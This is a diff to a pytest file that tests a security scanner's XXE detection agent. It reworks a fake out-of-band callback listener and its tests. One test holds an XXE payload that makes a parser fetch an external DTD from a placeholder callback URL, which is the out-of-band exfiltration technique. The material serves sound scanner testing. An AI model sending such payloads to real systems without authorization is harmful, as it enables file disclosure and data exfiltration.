@@ -32,12 +32,31 @@ def _resp(status=200, text=""):
 
 
 class _FakeCollaborator:
-    def __init__(self, url=None, hit=False):
-        self.url = url
-        self._hit = hit
+    """Fake OOB listener matching the REAL CollaboratorService API (host/port +
+    issue_token + SYNC was_hit with sub-path prefix matching). The previous fake
+    exposed `url` + `async poll()` — precisely the nonexistent API the production
+    bug called — which is how the AttributeError survived its suite."""
 
-    async def poll(self):
-        return self._hit
+    def __init__(self, hit_tokens=None):
+        self._hit_tokens = set(hit_tokens or [])
+        self.host = "127.0.0.1"
+        self.port = 9999
+        self._issued: list = []
+
+    def issue_token(self):
+        token = f"dast{900000 + len(self._issued)}"
+        self._issued.append(token)
+        return token
+
+    def was_hit(self, token):
+        if token in self._hit_tokens:
+            return True
+        # Mirror the real sub-path semantics (CALLBACK_URL/xxe.dtd counts).
+        return any(h.startswith(f"{token}/") for h in self._hit_tokens)
+
+    def register_callback(self, token, path_suffix=""):
+        """Simulate the target's parser fetching a resource under the token."""
+        self._hit_tokens.add(f"{token}/{path_suffix}" if path_suffix else token)
 
 
 # ── positive: inline file read ───────────────────────────────────────────────
@@ -80,17 +99,49 @@ async def test_parser_error_disclosure_detected():
 # ── positive: OOB exfiltration via collaborator ──────────────────────────────
 
 @pytest.mark.asyncio
-async def test_oob_exfiltration_confirmed(monkeypatch):
-    target = _target()
-    collaborator = _FakeCollaborator(url="http://collab.example/abc123", hit=True)
+async def test_oob_exfiltration_confirmed_token_scoped(monkeypatch):
+    """The parser fetches the DTD from a SUB-PATH of the callback URL
+    (CALLBACK_URL/xxe.dtd); the token-scoped check must still confirm via the
+    prefix match, and the evidence must cite the token."""
+    import re
 
-    # xxe_agent imports asyncio locally inside run(), so patch the real
-    # asyncio.sleep directly rather than a module attribute that doesn't exist
-    # until the function executes. The 3s OOB-wait sleep is the only one hit
-    # in this path, so this keeps the test fast without touching timing logic.
+    target = _target()
+    collaborator = _FakeCollaborator()
+
     monkeypatch.setattr("asyncio.sleep", AsyncMock(return_value=None))
-    # Group name and placeholder must match dast/payloads/xxe.yaml: the OOB
-    # group is "oob_dtd" and the collaborator placeholder is bare CALLBACK_URL.
+    monkeypatch.setattr(
+        "dast.agents.xxe_agent.get_payloads",
+        lambda category, group: (
+            ['<!DOCTYPE x [<!ENTITY % xxe SYSTEM "CALLBACK_URL/xxe.dtd"> %xxe;]>'] if group == "oob_dtd" else []
+        ),
+    )
+
+    async def fake_send(client, method, url, headers, body, payload=None):
+        # Simulate the vulnerable parser: extract the token embedded in the payload
+        # and fetch the DTD sub-path on the collaborator.
+        m = re.search(r"http://127\.0\.0\.1:9999/(dast\d+)", body or "")
+        if m:
+            collaborator.register_callback(m.group(1), path_suffix="xxe.dtd")
+        return _resp(200, "<root>ok</root>")
+
+    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
+        findings = await XxeAgent().run(target, MagicMock(), collaborator=collaborator)
+
+    assert len(findings) == 1
+    assert "Out-of-Band Exfiltration" in findings[0].title
+    assert findings[0].confirmed is True
+    assert findings[0].bypass_validation is True
+    assert "dast900000" in findings[0].evidence  # the token is in the evidence
+
+
+@pytest.mark.asyncio
+async def test_oob_no_callback_no_finding(monkeypatch):
+    """Tokens issued but never hit → no OOB finding (and no crash from the old
+    nonexistent `poll()` API)."""
+    target = _target()
+    collaborator = _FakeCollaborator()  # no hits registered
+
+    monkeypatch.setattr("asyncio.sleep", AsyncMock(return_value=None))
     monkeypatch.setattr(
         "dast.agents.xxe_agent.get_payloads",
         lambda category, group: (
@@ -104,9 +155,8 @@ async def test_oob_exfiltration_confirmed(monkeypatch):
     with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
         findings = await XxeAgent().run(target, MagicMock(), collaborator=collaborator)
 
-    assert len(findings) == 1
-    assert "Out-of-Band Exfiltration" in findings[0].title
-    assert findings[0].confirmed is True
+    assert findings == []
+    assert collaborator._issued  # payloads were actually sent with issued tokens
 
 
 # ── regression: real payloads load and the collaborator URL is substituted ───
@@ -116,8 +166,10 @@ async def test_oob_exfiltration_confirmed(monkeypatch):
 
 @pytest.mark.asyncio
 async def test_oob_real_payloads_substitute_callback_url(monkeypatch):
+    import re
+
     target = _target()
-    collaborator = _FakeCollaborator(url="http://collab.example/abc123", hit=False)
+    collaborator = _FakeCollaborator()
     monkeypatch.setattr("asyncio.sleep", AsyncMock(return_value=None))
 
     sent_bodies = []
@@ -130,9 +182,9 @@ async def test_oob_real_payloads_substitute_callback_url(monkeypatch):
         await XxeAgent().run(target, MagicMock(), collaborator=collaborator)
 
     # At least one OOB payload from the real xxe.yaml must have been sent with
-    # the placeholder replaced by the collaborator URL — and none may still
-    # carry the raw CALLBACK_URL token.
-    assert any(collaborator.url in body for body in sent_bodies)
+    # the placeholder replaced by a tokened collaborator URL — and none may
+    # still carry the raw CALLBACK_URL token.
+    assert any(re.search(r"http://127\.0\.0\.1:9999/dast\d+", body) for body in sent_bodies)
     assert not any("CALLBACK_URL" in body for body in sent_bodies)
 
 
